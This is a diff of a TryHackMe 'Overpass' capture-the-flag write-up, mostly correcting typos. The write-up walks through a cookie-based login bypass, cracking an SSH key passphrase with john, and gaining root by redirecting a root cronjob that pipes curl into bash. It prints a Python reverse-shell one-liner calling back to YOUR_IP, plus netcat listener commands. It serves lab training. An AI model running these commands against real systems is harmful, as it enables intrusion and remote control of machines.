@@ -35,7 +35,7 @@ When the scan has finished we see a `/admin` directory we haven't recognized bef
 /index.html (Status: 301)
 </pre>
 
-<i>This `/admin` directory contains a login form. Looking at the source code we detect a `login.js` file. When searching the `login.js` file for a vulnerability we can recognize that the `SessionToken` cookie has to be set to log-in. We can start our webbrowser, open the developer console and switch to the Application tab. Under cookies we can create our own and call it `SessionToken`. The value does not matter. Then we can reload the page and see that we are 'logged in'. The webpage shows now an ssh key.</i>
+<i>This `/admin` directory contains a login form. Looking at the source code we detect a `login.js` file. When searching the `login.js` file for a vulnerability we can recognize that the `SessionToken` cookie has to be set to log-in. We can start our webbrowser, open the developer console and switch to the Application tab. Under cookies we can create our own and call it `SessionToken`. The value does not matter. Then we can reload the page and see that we are 'logged in'. The webpage shows now an ssh private key.</i>
 
 <pre>
 -----BEGIN RSA PRIVATE KEY-----
@@ -70,11 +70,11 @@ ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
 -----END RSA PRIVATE KEY-----
 </pre>
 
-<i>Lets safe this key on our machine as `id_rsa`. But now we need a password for the key. We will use [`ssh2john.py`](https://www.openwall.com/john) to create a hash.<br>
+<i>Let's safe this key on our machine as `id_rsa`. But now we need a password for the key. We will use [`ssh2john.py`](https://www.openwall.com/john) to create a hash.<br>
 The full command looks like this: `python ./ssh2john.py ./id_rsa > id_rsa.hash`<br>
-Great, now we can use [`john`](https://www.openwall.com/john) to crack the hash. To specify we use the `--wordlist` flag. Our wordlist will be the [`rockyou.txt`](https://gitlab.com/kalilinux/packages/wordlists/-/blob/kali/master/rockyou.txt.gz).<br>
-The full command looks likethis: `john --wordlist=./rockyou.txt id_rsa.hash`<br>
-John returns us the following and presents the cracked password.</i>
+Great, now we can use [`john`](https://www.openwall.com/john) to crack the hash. To specify a wordlist we use the `--wordlist` flag. Our wordlist will be the [`rockyou.txt`](https://gitlab.com/kalilinux/packages/wordlists/-/blob/kali/master/rockyou.txt.gz).<br>
+The full command looks like this: `john --wordlist=./rockyou.txt id_rsa.hash`<br>
+John returns the following and presents the cracked password.</i>
 
 <pre>
 Using default input encoding: UTF-8
@@ -90,16 +90,16 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 Session completed
 </pre>
 
-<i>Now we have a ssh key and the password. Before logging in with: `ssh -i ./id_rsa james@MACHINE_IP` we have to set the permissions on the `id_rsa` file using `chmod 600 id_rsa`. And here we go we are logged in as james. And in the home directory we can find the `ùser.txt` file.</i>
+<i>Now we have an ssh private key and the password. Before logging in with: `ssh -i ./id_rsa james@MACHINE_IP` we have to set permissions on the `id_rsa` file using `chmod 600 id_rsa`. And here we go, we are logged in as james. And in the home directory we can find the `user.txt` file.</i>
 
 1. Hack the machine and get the flag in `user.txt`.<br>
    `thm{65c1aaf000506e56996822c6281e6bf7}`
 
-<i>In the home directory we can also find a `.overpass` file and we can `cat` it out.</i>
+<i>In the home directory we can also find a `.overpass` file which we can `cat` out.</i>
 
 <pre>[{"name":"System","pass":"saydrawnlyingpicture"}]</pre>
 
-<i>Did he really stored his root password here? Trying switcing the user to root does not work. Lokking at the `/etc/crontab` file shows us a a cronjob runnig as root.</i>
+<i>Did he really store his root password here? Trying to switch the user to root does not work. Looking at the `/etc/crontab` file shows a cronjob running as root.</i>
 
 <pre>
 17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
@@ -109,14 +109,14 @@ Session completed
 * * * * * <b>root curl overpass.thm/downloads/src/buildscript.sh | bash</b>
 </pre>
 
-<i>Ok he tries to fetch a file from overpass.thm. Maybe we can change the overpass.thm to point to our ip adress. To do so we have to edit the `/etc/hosts` file using nano.<br>
+<i>Ok, he tries to fetch a file from `overpass.thm`. Maybe we can change the `overpass.thm` to point to our own internal ip address. To do so we have to edit the `/etc/hosts` file using `nano`.<br>
 The full command looks like this: `nano /etc/hosts`<br>
-Then you have to edit the content to look like the following. The YOUR_IP should be your internal tryhackme adress.</i>
+Then you have to edit the content to look like the following. The YOUR_IP should be your internal tryhackme vpn address.</i>
 
 <pre>
 127.0.0.1 localhost
 127.0.1.1 overpass-prod
-<b>YOUR_IP:8000 overpass.thm</b>
+<b>YOUR_IP overpass.thm</b>
 ::1     ip6-localhost ip6-loopback
 fe00::0 ip6-localnet
 ff00::0 ip6-mcastprefix
@@ -124,16 +124,16 @@ ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
 </pre>
 
-<i>That's done so let's move on and create a file called `buildscript.sh` in the folder structure `downloads/src/`. Create these folders depending to your server. Into the `buildscript.sh` we paste a reverse shell from [pentestmonkey.net](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).</i>
+<i>That's done. So let's move on and create a file called `buildscript.sh` according to this folder structure `downloads/src/`. Create these folders depending on your server starting location. We paste a reverse shell from [pentestmonkey.net](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) into `buildscript.sh`.</i>
 
 <pre>
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",8000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
 </pre>
 
-<i>Now we have to set up a smal server and a netcat listener.<br>
+<i>Now we have to set up a small static file server and a `netcat` listener.<br>
 The server command: `sudo python3 -m http.server 80`<br>
 The netcat listener: `nc -lnvp 8080`<br>
-After some waiting our netcat listener catches the reverse shell. And we became root! We can `cat` the `root.txt`.</i>
+After some waiting our `netcat` listener catches the reverse shell. And we became root! We can `cat` the `root.txt` out.</i>
 
 2. Escalate your privileges and get the flag in `root.txt`.<br>
    `thm{7f336f8c359dbac18d54fdd64ea753bb}`
